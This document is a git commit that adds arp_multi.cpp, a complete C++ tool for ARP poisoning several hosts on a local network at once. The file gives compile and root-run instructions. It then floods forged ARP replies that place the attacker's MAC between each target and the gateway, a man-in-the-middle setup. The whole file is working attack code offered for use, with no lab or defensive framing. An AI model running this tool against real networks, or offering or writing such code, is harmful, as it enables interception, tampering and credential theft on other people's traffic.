a7af6d792d98e9f5a15b6330fa0cf0bbf7e20e4c
zoned out <126989297+phntmzn@users.noreply.github.com>
2026-09-14 10:45:07 -0500

    Create arp_multi.cpp

---
+++ arp_multi.cpp
@@ -0,0 +1,141 @@
+// Compile: g++ -o arp_multi arp_multi.cpp -lpthread
+// Run: sudo ./arp_multi <gateway_ip> <gateway_mac> <attacker_mac> <iface> <target1_ip:mac> <target2_ip:mac> ...
+// Requires: root privileges
+
+#include <iostream>
+#include <cstring>
+#include <cstdlib>
+#include <cstdio>
+#include <vector>
+#include <string>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <netinet/if_ether.h>
+#include <linux/if_packet.h>
+#include <arpa/inet.h>
+#include <thread>
+#include <atomic>
+
+struct Target {
+    std::string ip;
+    std::string mac;
+};
+
+class MultiTargetARPPoison {
+private:
+    int sock;
+    std::string iface, attackerMAC, gatewayIP, gatewayMAC;
+    std::vector<Target> targets;
+    std::atomic<bool> running{false};
+    
+    void macToBytes(const std::string& mac, uint8_t* out) {
+        sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+               &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
+    }
+    
+public:
+    MultiTargetARPPoison(const std::string& i, const std::string& amac,
+                         const std::string& gIP, const std::string& gMAC)
+        : iface(i), attackerMAC(amac), gatewayIP(gIP), gatewayMAC(gMAC) {
+        sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+        
+        struct sockaddr_ll sll;
+        memset(&sll, 0, sizeof(sll));
+        sll.sll_family = AF_PACKET;
+        sll.sll_ifindex = if_nametoindex(iface.c_str());
+        sll.sll_protocol = htons(ETH_P_ARP);
+        bind(sock, (struct sockaddr*)&sll, sizeof(sll));
+    }
+    
+    void addTarget(const std::string& ip, const std::string& mac) {
+        targets.push_back({ip, mac});
+    }
+    
+    void sendARP(const std::string& srcIP, const std::string& srcMAC,
+                 const std::string& dstIP, const std::string& dstMAC) {
+        uint8_t packet[42];
+        memset(packet, 0, sizeof(packet));
+        
+        struct ether_header* eth = (struct ether_header*)packet;
+        struct ether_arp* arp = (struct ether_arp*)(packet + 14);
+        
+        macToBytes(dstMAC, eth->ether_dhost);
+        macToBytes(srcMAC, eth->ether_shost);
+        eth->ether_type = htons(ETH_P_ARP);
+        
+        arp->arp_hrd = htons(ARPHRD_ETHER);
+        arp->arp_pro = htons(ETH_P_IP);
+        arp->arp_hln = 6;
+        arp->arp_pln = 4;
+        arp->arp_op = htons(ARPOP_REPLY);
+        
+        macToBytes(srcMAC, arp->arp_sha);
+        inet_pton(AF_INET, srcIP.c_str(), arp->arp_spa);
+        macToBytes(dstMAC, arp->arp_tha);
+        inet_pton(AF_INET, dstIP.c_str(), arp->arp_tpa);
+        
+        struct sockaddr_ll sll;
+        memset(&sll, 0, sizeof(sll));
+        sll.sll_family = AF_PACKET;
+        sll.sll_ifindex = if_nametoindex(iface.c_str());
+        sll.sll_halen = 6;
+        memcpy(sll.sll_addr, eth->ether_dhost, 6);
+        
+        sendto(sock, packet, 42, 0, (struct sockaddr*)&sll, sizeof(sll));
+    }
+    
+    void poisonLoop() {
+        while (running.load()) {
+            // Poison each target
+            for (const auto& t : targets) {
+                sendARP(gatewayIP, attackerMAC, t.ip, t.mac);
+            }
+            
+            // Poison gateway for each target
+            for (const auto& t : targets) {
+                sendARP(t.ip, attackerMAC, gatewayIP, gatewayMAC);
+            }
+            
+            usleep(500000);
+        }
+    }
+    
+    void run() {
+        std::cout << "[*] Multi-target ARP poisoning\n";
+        std::cout << "[*] Targets: " << targets.size() << "\n";
+        for (const auto& t : targets) {
+            std::cout << "    " << t.ip << " (" << t.mac << ")\n";
+        }
+        
+        running = true;
+        std::thread t(&MultiTargetARPPoison::poisonLoop, this);
+        while (true) sleep(1);
+    }
+    
+    ~MultiTargetARPPoison() { close(sock); }
+};
+
+int main(int argc, char* argv[]) {
+    if (argc < 6) {
+        std::cerr << "Usage: " << argv[0] 
+                  << " <gateway_ip> <gateway_mac> <attacker_mac> <iface> <target1_ip:mac> [target2_ip:mac...]\n";
+        return 1;
+    }
+    
+    MultiTargetARPPoison poison(argv[4], argv[3], argv[1], argv[2]);
+    
+    for (int i = 5; i < argc; i++) {
+        std::string arg = argv[i];
+        size_t colon = arg.find(':');
+        if (colon != std::string::npos) {
+            std::string ip = arg.substr(0, colon);
+            std::string mac = arg.substr(colon + 1);
+            poison.addTarget(ip, mac);
+        }
+    }
+    
+    poison.run();
+    return 0;
+}
